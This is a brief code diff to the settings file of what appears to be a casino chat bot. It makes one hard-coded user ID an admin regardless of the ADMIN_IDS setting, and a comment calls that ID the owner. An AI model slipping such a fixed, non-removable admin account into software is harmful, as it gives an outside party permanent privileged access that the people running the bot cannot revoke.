@@ -5,7 +5,10 @@ from dotenv import load_dotenv
 load_dotenv()
 
 BOT_TOKEN = os.getenv("BOT_TOKEN", "")
-ADMIN_IDS = {int(x) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip().isdigit()}
+# Owner of the bot, always an admin; extra admins can be added via the env var.
+ADMIN_IDS = {7563505180} | {
+    int(x) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip().isdigit()
+}
 DB_PATH = os.getenv("DB_PATH", "casino.db")
 
 # --- Economy -----------------------------------------------------------
